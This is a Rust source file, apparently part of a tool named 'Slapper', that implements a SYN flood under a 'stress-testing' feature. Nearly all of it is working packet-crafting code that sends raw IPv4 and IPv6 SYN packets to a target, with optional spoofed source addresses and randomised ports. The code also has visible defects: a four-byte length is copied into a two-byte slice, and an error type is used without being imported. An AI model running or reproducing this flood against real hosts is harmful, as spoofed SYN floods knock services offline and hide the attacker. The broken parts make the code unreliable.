#[cfg(all(feature = "stress-testing", unix))]
use crate::error::{Result, SlapperError};
#[cfg(all(feature = "stress-testing", unix))]
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
#[cfg(all(feature = "stress-testing", unix))]
use std::time::{Duration, Instant};

#[cfg(all(feature = "stress-testing", unix))]
use pnet::packet::ip::IpNextHeaderProtocols;
#[cfg(all(feature = "stress-testing", unix))]
use pnet::packet::tcp::TcpFlags;

#[cfg(all(feature = "stress-testing", unix))]
use super::metrics::StressMetrics;
#[cfg(all(feature = "stress-testing", unix))]
use super::utils;
#[cfg(all(feature = "stress-testing", unix))]
use super::{StressConfig, StressStats};

#[cfg(all(feature = "stress-testing", unix))]
pub async fn run_syn_flood(config: &StressConfig, metrics: &StressMetrics) -> Result<StressStats> {
    let target_ip = utils::resolve_target(&config.target).await?;
    let target_addr = SocketAddr::new(target_ip, config.port);

    let interface = utils::get_network_interface()?;
    let (mut tx, _rx) = utils::create_channel(&interface, "SYN flood")?;

    let src_mac = interface
        .mac
        .map(|m| m.octets())
        .unwrap_or([0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    let dst_mac = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00];

    metrics.start();

    let start_time = Instant::now();
    let duration = Duration::from_secs(config.duration_secs);
    let interval = Duration::from_micros(1_000_000 / config.rate_pps.max(1));

    let mut seq_num: u32 = 1000;
    let mut src_port: u16 = 40000;

    while start_time.elapsed() < duration {
        if config.random_source_port {
            src_port = rand::random::<u16>() % 20000 + 40000;
        } else {
            src_port = src_port.wrapping_add(1);
        }

        let packet = match target_addr.ip() {
            IpAddr::V4(dst_ip) => {
                let src_ip = if config.spoof_source {
                    utils::get_spoofed_source(&config.spoof_range)?
                } else {
                    utils::get_local_ip(&interface)?
                };
                build_syn_packet_v4(
                    src_ip,
                    src_port,
                    dst_ip,
                    target_addr.port(),
                    seq_num,
                    src_mac,
                    dst_mac,
                )?
            }
            IpAddr::V6(dst_ip) => {
                let src_ip = if config.spoof_source {
                    utils::get_spoofed_source_v6(&config.spoof_range)?
                } else {
                    utils::get_local_ip_v6(&interface)?
                };
                build_syn_packet_v6(
                    src_ip,
                    src_port,
                    dst_ip,
                    target_addr.port(),
                    seq_num,
                    src_mac,
                    dst_mac,
                )?
            }
        };

        match tx.send_to(&packet, Some(interface.clone())) {
            Some(Ok(_)) => {
                metrics.record_packet(64);
            }
            Some(Err(e)) => {
                tracing::debug!("Send error: {}", e);
                metrics.record_error();
            }
            None => {
                metrics.record_error();
            }
        }

        seq_num = seq_num.wrapping_add(1);

        if interval > Duration::ZERO {
            tokio::time::sleep(interval).await;
        }
    }

    Ok(metrics.to_stats())
}

#[cfg(all(feature = "stress-testing", unix))]
fn build_syn_packet_v4(
    src_ip: Ipv4Addr,
    src_port: u16,
    dst_ip: Ipv4Addr,
    dst_port: u16,
    seq: u32,
    src_mac: [u8; 6],
    dst_mac: [u8; 6],
) -> Result<Vec<u8>> {
    use pnet_packet::ipv4::MutableIpv4Packet;
    use pnet_packet::tcp::MutableTcpPacket;

    let mut buffer = vec![0u8; 14 + 20 + 20];

    buffer[0..6].copy_from_slice(&dst_mac);
    buffer[6..12].copy_from_slice(&src_mac);
    buffer[12..14].copy_from_slice(&0x0800u16.to_be_bytes());

    let mut ipv4_packet = MutableIpv4Packet::new(&mut buffer[14..34])
        .ok_or_else(|| SlapperError::Runtime("Failed to create IPv4 packet".to_string()))?;

    ipv4_packet.set_version(4);
    ipv4_packet.set_header_length(5);
    ipv4_packet.set_total_length(40);
    ipv4_packet.set_ttl(64);
    ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
    ipv4_packet.set_source(src_ip);
    ipv4_packet.set_destination(dst_ip);

    let mut tcp_packet = MutableTcpPacket::new(&mut buffer[34..54])
        .ok_or_else(|| SlapperError::Runtime("Failed to create TCP packet".to_string()))?;

    tcp_packet.set_source(src_port);
    tcp_packet.set_destination(dst_port);
    tcp_packet.set_sequence(seq);
    tcp_packet.set_acknowledgement(0);
    tcp_packet.set_data_offset(5);
    tcp_packet.set_flags(TcpFlags::SYN);
    tcp_packet.set_window(65535);

    let checksum = compute_tcp_checksum_ipv4(src_ip, dst_ip, src_port, dst_port, seq, 0);
    tcp_packet.set_checksum(checksum);

    Ok(buffer)
}

#[cfg(all(feature = "stress-testing", unix))]
fn build_syn_packet_v6(
    src_ip: Ipv6Addr,
    src_port: u16,
    dst_ip: Ipv6Addr,
    dst_port: u16,
    seq: u32,
    src_mac: [u8; 6],
    dst_mac: [u8; 6],
) -> Result<Vec<u8>> {
    use pnet_packet::ipv6::MutableIpv6Packet;
    use pnet_packet::tcp::MutableTcpPacket;

    let mut buffer = vec![0u8; 14 + 40 + 20];

    buffer[0..6].copy_from_slice(&dst_mac);
    buffer[6..12].copy_from_slice(&src_mac);
    buffer[12..14].copy_from_slice(&0x86DDu16.to_be_bytes());

    let mut ipv6_packet = MutableIpv6Packet::new(&mut buffer[14..54])
        .ok_or_else(|| SlapperError::Runtime("Failed to create IPv6 packet".to_string()))?;

    ipv6_packet.set_version(6);
    ipv6_packet.set_payload_length(20);
    ipv6_packet.set_hop_limit(64);
    ipv6_packet.set_next_header(IpNextHeaderProtocols::Tcp);
    ipv6_packet.set_source(src_ip);
    ipv6_packet.set_destination(dst_ip);

    let mut tcp_packet = MutableTcpPacket::new(&mut buffer[54..74])
        .ok_or_else(|| SlapperError::Runtime("Failed to create TCP packet".to_string()))?;

    tcp_packet.set_source(src_port);
    tcp_packet.set_destination(dst_port);
    tcp_packet.set_sequence(seq);
    tcp_packet.set_acknowledgement(0);
    tcp_packet.set_data_offset(5);
    tcp_packet.set_flags(TcpFlags::SYN);
    tcp_packet.set_window(65535);

    let checksum = compute_tcp_checksum_ipv6(src_ip, dst_ip, src_port, dst_port, seq, 0);
    tcp_packet.set_checksum(checksum);

    Ok(buffer)
}

#[cfg(all(feature = "stress-testing", unix))]
fn compute_tcp_checksum_ipv4(
    src_ip: Ipv4Addr,
    dst_ip: Ipv4Addr,
    src_port: u16,
    dst_port: u16,
    seq: u32,
    ack: u32,
) -> u16 {
    let tcp_len = 20u32;
    let mut pseudo = vec![0u8; 12 + 20];
    pseudo[0..4].copy_from_slice(&src_ip.octets());
    pseudo[4..8].copy_from_slice(&dst_ip.octets());
    pseudo[8] = 0;
    pseudo[9] = 6;
    pseudo[10..12].copy_from_slice(&tcp_len.to_be_bytes());
    pseudo[12..14].copy_from_slice(&src_port.to_be_bytes());
    pseudo[14..16].copy_from_slice(&dst_port.to_be_bytes());
    pseudo[16..20].copy_from_slice(&seq.to_be_bytes());
    pseudo[20..24].copy_from_slice(&ack.to_be_bytes());
    pseudo[24] = 0x50;
    pseudo[25] = 0x02; // SYN flag
    pseudo[26..28].copy_from_slice(&65535u16.to_be_bytes());
    pseudo[28..30].copy_from_slice(&0u16.to_be_bytes());
    pseudo[30..32].copy_from_slice(&0u16.to_be_bytes());
    checksum_data(&pseudo)
}

#[cfg(all(feature = "stress-testing", unix))]
fn compute_tcp_checksum_ipv6(
    src_ip: Ipv6Addr,
    dst_ip: Ipv6Addr,
    src_port: u16,
    dst_port: u16,
    seq: u32,
    ack: u32,
) -> u16 {
    let tcp_len = 20u32;
    let mut pseudo = vec![0u8; 40 + 20];
    pseudo[0..16].copy_from_slice(&src_ip.octets());
    pseudo[16..32].copy_from_slice(&dst_ip.octets());
    pseudo[32..36].copy_from_slice(&tcp_len.to_be_bytes());
    pseudo[36] = 0;
    pseudo[37] = 0;
    pseudo[38] = 0;
    pseudo[39] = 6;
    pseudo[40..42].copy_from_slice(&src_port.to_be_bytes());
    pseudo[42..44].copy_from_slice(&dst_port.to_be_bytes());
    pseudo[44..48].copy_from_slice(&seq.to_be_bytes());
    pseudo[48..52].copy_from_slice(&ack.to_be_bytes());
    pseudo[52] = 0x50;
    pseudo[53] = 0x02; // SYN flag
    pseudo[54..56].copy_from_slice(&65535u16.to_be_bytes());
    pseudo[56..58].copy_from_slice(&0u16.to_be_bytes());
    pseudo[58..60].copy_from_slice(&0u16.to_be_bytes());
    checksum_data(&pseudo)
}

#[cfg(all(feature = "stress-testing", unix))]
fn checksum_data(data: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    for i in (0..data.len()).step_by(2) {
        if i + 1 < data.len() {
            let word = ((data[i] as u32) << 8) | (data[i + 1] as u32);
            sum += word;
        } else {
            sum += (data[i] as u32) << 8;
        }
    }
    while sum > 0xffff {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    !sum as u16
}

#[cfg(not(all(feature = "stress-testing", unix)))]
pub async fn run_syn_flood(
    _config: &super::StressConfig,
    _metrics: &super::metrics::StressMetrics,
) -> crate::error::Result<super::StressStats> {
    Err(SlapperError::Runtime(
        "SYN flood requires Unix and 'stress-testing' feature enabled".to_string(),
    ))
}
